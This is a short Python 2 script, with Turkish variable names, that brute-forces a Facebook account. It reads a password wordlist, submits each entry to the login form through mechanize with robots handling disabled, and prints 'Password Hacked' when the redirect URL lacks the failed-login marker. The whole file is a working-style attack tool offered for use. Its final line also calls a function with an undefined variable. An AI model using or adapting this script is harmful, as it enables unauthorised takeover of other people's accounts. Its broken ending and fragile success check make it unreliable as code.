import mechanize
import sys


#error code : login_attempt=1&lwv=100


giris = "https://www.facebook.com/login.php?login_attempt=1"

try:
	username = sys.argv[1]
	password = sys.argv[2]
	a = open(password, "r")
	sifreler = a.readlines()
	print "[*] OK."
except:
	print "[-] Error..!"
	exit()



def saldiri(sifre):
	try:
		br.open(giris)
		br.select_form(nr=0)
		br.form["email"] = username
		br.form["pass"] = sifre
		br.submit()
		log = br.geturl()
		if "login_attempt=1&lwv=100" in log:
			#print "[+] Password Hacked.. : " + sifre
			print "[!] NOT : " + sifre
		else:
			#print "[!] NOT : " + sifre
			print "[+] Password Hacked.. : " + sifre
			exit()
	except:
		pass

def kesif():
	for sifre in sifreler:
		saldiri(sifre.replace("\n", ""))

br = mechanize.Browser()
br.set_handle_robots(False)

kesif()
saldiri(sifre)
